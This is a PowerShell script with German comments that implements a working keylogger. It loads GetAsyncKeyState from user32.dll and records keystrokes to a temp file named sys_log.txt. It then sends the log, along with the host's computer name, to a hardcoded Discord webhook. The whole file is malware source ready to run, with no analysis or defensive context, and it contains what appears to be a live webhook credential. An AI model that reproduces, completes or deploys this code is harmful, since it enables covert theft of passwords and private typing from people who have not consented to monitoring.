$webhookUrl = "https://discord.com/api/webhooks/1491835548384624771/Ctl5jEJOKGH2VODXsix4B_LxlUPjwrawgF51OGTc9S19SlFDEyVhQHoHuC16VljzCrL5"

# 1. Start-Meldung (einfacher und stabiler)
$startMsg = @{ content = "✅ Logger aktiv auf: $env:COMPUTERNAME" } | ConvertTo-Json -Compress
try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $startMsg -ContentType "application/json"
} catch {}

$LogPath = "$env:TEMP\sys_log.txt"
if (Test-Path $LogPath) { Remove-Item $LogPath -Force }

# 2. Keylogger Schnittstelle
$code = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
Add-Type -TypeDefinition $code

$lastKeys = @{}

# 3. Main Loop
while ($true) {
    Start-Sleep -Milliseconds 20 # CPU-Schonung
    
    for ($i = 8; $i -le 190; $i++) {
        $state = [Win32]::GetAsyncKeyState($i)
        
        if ($state -and 0x8000) {
            if (-not $lastKeys[$i]) {
                $lastKeys[$i] = $true
                $char = ""

                # Filter: Nur nützliche Tasten loggen
                if ($i -ge 65 -and $i -le 90) { $char = [char]$i } # A-Z
                elseif ($i -ge 48 -and $i -le 57) { $char = [char]$i } # 0-9
                elseif ($i -eq 32) { $char = " " } # Leerzeichen
                elseif ($i -eq 13) { $char = "`n[ENTER]`n" } # Enter
                elseif ($i -eq 8) { $char = "[BACK]" } # Backspace

                if ($char -ne "") {
                    $char | Out-File -FilePath $LogPath -Append -NoNewline -Encoding utf8
                }
            }
        } else {
            $lastKeys[$i] = $false
        }
    }

    # 4. Senden an Discord (alle 50 Zeichen für mehr Stabilität)
    if (Test-Path $LogPath) {
        $fileInfo = Get-Item $LogPath
        if ($fileInfo.Length -gt 50) {
            $logContent = Get-Content $LogPath -Raw
            if ($logContent.Trim() -ne "") {
                $payload = @{ content = "⌨️ **Log:**`n$logContent" } | ConvertTo-Json -Compress
                try {
                    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
                    Clear-Content $LogPath
                } catch {
                    Start-Sleep -Seconds 10 # Bei Error (Spam-Schutz) warten
                }
            }
        }
    }
}